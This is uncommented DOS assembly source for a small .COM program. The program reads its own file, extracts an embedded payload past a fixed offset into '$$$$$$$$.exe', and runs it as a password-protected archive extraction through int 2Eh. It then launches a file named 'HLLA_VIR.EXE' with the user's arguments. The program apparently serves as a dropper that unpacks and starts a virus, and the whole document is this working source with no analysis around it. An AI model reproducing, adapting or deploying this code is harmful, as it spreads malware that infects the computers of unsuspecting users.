cseg segment para 'code'
assume cs:cseg,ds:cseg,es:cseg
.286
org 100h
start proc near
      push cs
      pop ds
      push cs
      pop es
      lea di,[@5]
      mov ah,62h
      int 21h
      push bx
      mov SS_SAVE,bx
      pop ds
;---
      push di
      mov es,word ptr ds:[2ch]
      push cs
      pop ds
      mov cx,0ffffh
      xor di,di
      xor ax,ax
      inc al
      repne scasw
      xchg si,di
      pop di
      push di
      xor cx,cx
Pred:
      mov al, byte ptr es:[si]
      mov byte ptr ds:[di],al
      cmp al,0
      jz Next
      inc si
      inc di
      inc cx
      jmp short Pred
Next:
      push cs
      pop es
      inc cx
      mov al,byte ptr ds:[ExecName]
      add al,cl
      mov byte ptr ds:[ExecName],al
      dec di
      mov Zerro,di
      pop dx
      mov ax,3d00h
      int 21h
      jnb @Exit1
      jmp @Exit
@Exit1:
      xchg bx,ax
      mov HS,bx
      mov ax,4200h
      xor cx,cx
      mov dx,MyConst
      int 21h
      mov ah,3ch
      xor cx,cx
      lea dx,FileName1
      int 21h
      xchg bx,ax
      mov HW,bx
@c:
      mov bx,HS
      mov ah,3fh
      lea dx,Buf
      mov cx,1024*5
      int 21h
      xchg cx,ax
      mov bx,HW
      mov ah,40h
      lea dx,Buf
      int 21h
      cmp ax,1024*5
      je @c
      mov ah,3eh
      int 21h
      mov ah,3eh
      mov bx,HS
      int 21h
;---
      mov di,Zerro
      inc di
      mov byte ptr ds:[di],20h
      inc di
      mov bx,SS_SAVE
      push bx
      pop ds

      xor ax,ax
      mov al,byte ptr ds:[80h]
      cmp al,0
      jne @@a
      push cs
      pop ds
      mov di,Zerro
      inc di
      mov byte ptr ds:[di],13
      mov byte ptr ds:[di+1],0
      jmp short @a
@@a:
      mov cl,byte ptr cs:[ExecName]
      add cl,al
      mov byte ptr cs:[ExecName],cl
      mov si,82h
      xor cx,cx
      xchg cx,ax
@b:
      lodsb
      stosb
      loop @b
@a:
      push cs
      pop ds
      mov ds:[SS_SAVE],ss
      mov ds:[SP_SAVE],sp
      lea si,FileName
      int 2eh
      mov ss,ds:[SS_SAVE]
      mov sp,ds:[SP_SAVE]
      push cs
      pop ds
      lea si,ExecName
      int 2eh
      push cs
      pop ds
      mov ss,ds:[SS_SAVE]
      mov sp,ds:[SP_SAVE]
@Exit:
      mov ax,4c00h
      int 21h
;---
FileName1 db '$$$$$$$$.exe',0h
Zerro dw ?
HS dw ?
HW dw ?
SS_SAVE dw ?
SP_SAVE dw ?
FileName  db @2
@1:
    db '$$$$$$$$.exe -e -y -g12345678.123',13
@2 equ $-@1
ExecName db 13
@3:
         db 'HLLA_VIR.EXE '
@5:
         db 20h
         db 128 dup (90h)
@4 equ $-@3
Buf db 1024 * 5 dup (90h)
MyConst dw 02EBh
start endp
cseg ends
end start
